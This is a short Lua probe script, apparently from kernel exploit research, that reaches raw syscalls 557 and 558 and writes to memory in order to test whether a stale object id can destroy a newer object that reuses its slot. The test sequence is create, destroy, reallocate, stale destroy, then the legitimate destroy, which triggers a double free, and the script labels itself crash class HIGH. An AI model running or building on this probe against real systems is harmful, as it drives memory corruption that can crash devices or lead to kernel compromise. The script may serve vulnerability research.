-- CRASH_CLASS: HIGH
-- PROBE 793a: is 558's lookup generation-checked?
--
-- aio's two lookups rebuild the id as (gen<<13)|slot and reject a stale
-- generation (561a). 557 shares aio's id allocator but not its table. If 558
-- checks only the slot, a stale id can destroy a newer object in the same slot,
-- and the newer object's own destroy then frees it twice.
print("=== PROBE 793a: 557 STALE ID ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a)
    a=to_num(a); if a<0 then a=a+18446744073709551616 end
    return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296))
end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "ERR" end
    return to_num(r)
end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function alive() return tostring(call(mk(20),0,0,0,0,0,0)) end
local pl=to_num(memory.alloc(0x100))
local function fill(b) for i=0,0x100-8,8 do wq(pl+i,0) end wq(pl,b*0x1111111111111111) end
local function create(tag,b)
    fill(b)
    local r=call(mk(557),pl,0x1000,0,0,0,0)
    print(string.format("[%s] create=%s",tag,tostring(r)))
    return r
end
local function destroy(tag,id)
    if type(id)~="number" or id<=0 then print(string.format("[%s] skip",tag)) return end
    local r=call(mk(558),id,0,0,0,0,0)
    print(string.format("[%s] destroy(%X of %X)=%s alive=%s",tag,id,id,tostring(r),alive()))
    return r
end
local a=create("A",1)
local b=create("B",2)
print(string.format("[0] ids A=%s B=%s",tostring(a),tostring(b)))
destroy("A1",a)
local c=create("C",3)            -- should reuse A's slot
print(string.format("[0] ids A=%s B=%s C=%s",tostring(a),tostring(b),tostring(c)))
destroy("A2-stale",a)          -- stale: same slot as C if unchecked
destroy("C-own",c)             -- C's own destroy: double free if A2 hit C
destroy("B",b)
print("[E] final alive="..alive())
print("=== 793a DONE ===")
